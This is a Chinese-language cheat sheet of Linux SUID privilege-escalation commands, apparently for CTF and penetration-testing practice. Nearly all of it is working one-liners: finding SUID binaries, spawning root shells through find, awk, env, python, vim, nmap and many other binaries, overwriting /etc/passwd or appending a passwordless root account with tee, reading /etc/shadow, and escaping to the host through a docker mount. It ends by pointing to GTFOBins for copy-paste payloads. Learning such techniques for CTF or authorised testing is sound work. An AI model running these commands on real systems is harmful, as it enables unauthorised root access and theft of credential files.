## SUID提权

找SUID文件

```bash
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000-exec ls -ldb {} \; 
```

find提权

```bash
find -name flag4 -exec "/bin/sh" -p \;
```

awk提权

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

choom提权

```bash
/usr/bin/choom -n 0 -- cat /root/flag
/usr/bin/choom -n 0 -- /bin/bash -p
```

*   **`env`**
    *   利用：`/usr/bin/env /bin/sh -p`
    *   *这是最常见的 SUID 提权之一。*
*   **`time`**
    *   利用：`/usr/bin/time /bin/sh -p`
    *   *注意：必须是 `/usr/bin/time` 这个二进制文件，而不是 Shell 内置的 `time` 命令。*
*   **`nice`**
    *   利用：`/usr/bin/nice /bin/sh -p`
*   **`taskset`**
    *   利用：`/usr/bin/taskset 1 /bin/sh -p`
*   **`ionice`**
    *   利用：`/usr/bin/ionice /bin/sh -p`
*   **`flock`**
    *   利用：`/usr/bin/flock -u / /bin/sh -p`
*   **`xargs`**
    *   利用：`xargs -a /dev/null sh -p`

*   **`python` / `python3`**
    *   利用：`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
*   **`perl`**
    *   利用：`perl -e 'exec "/bin/sh";'`
*   **`ruby`**
    *   利用：`ruby -e 'exec "/bin/sh"'`
*   **`php`**
    *   利用：`php -r "pcntl_exec('/bin/sh', ['-p']);"`
*   **`lua`**
    *   利用：`lua -e 'os.execute("/bin/sh")'`
*   **`gcc` / `g++`** (极其危险)
    *   利用：可以通过 `-wrapper` 参数执行命令。

*   **`vim` / `vi`**
    *   利用：打开后输入 `:!/bin/sh`，或者 `vim -c ':!/bin/sh'`。
*   **`less` / `more`**
    *   利用：在查看文件时输入 `!/bin/sh`。
*   **`nano`**
    *   利用：`nano -s /bin/sh` (旧版本) 或通过 `^R^X` (Read File -> Execute Command)。
*   **`ed`**
    *   利用：`ed` -> `!/bin/sh`。

*   **`cp`**
    *   利用：覆盖 `/etc/passwd`（把无密码的 root 用户写进去）或覆盖 `/etc/shadow`。
    *   命令：`cp my_passwd /etc/passwd`
*   **`mv`**
    *   利用：同上。
*   **`tar`** (极少见 SUID，但很强)
    *   利用：`tar` 可以保留文件权限或覆盖任意文件。
*   **`date`**
    *   利用：`date -f /etc/shadow` (读取敏感文件内容)。
*   **`dd`**
    *   利用：`dd if=my_passwd of=/etc/passwd`。
*   **`tee`**
    *   利用：`echo "root::0:0::/root:/bin/bash" | tee -a /etc/passwd` (追加 root 账号)。



*   **`nmap`** (仅限旧版本 2.02-5.21)
    *   利用：`nmap --interactive` 之后输入 `!sh`。现代版 nmap 已经移除了这个功能。
*   **`systemctl`**
    *   利用：如果 SUID，可以创建一个恶意的 service 文件来执行命令。
*   **`docker`**
    *   利用：`docker run -v /:/mnt -it alpine chroot /mnt sh` (直接挂载宿主机)。

在 CTF 或渗透测试中，不需要死记硬背。当你用 `find / -perm -u=s ...` 扫出一个你没见过的二进制文件时（例如 `/usr/bin/base64`），直接去查阅：

👉 **https://gtfobins.github.io/**

1.  打开网站。
2.  搜索二进制文件名（例如 `choom` 或 `base64`）。
3.  点击 **SUID** 标签。
4.  它会直接给你复制粘贴的 Payload。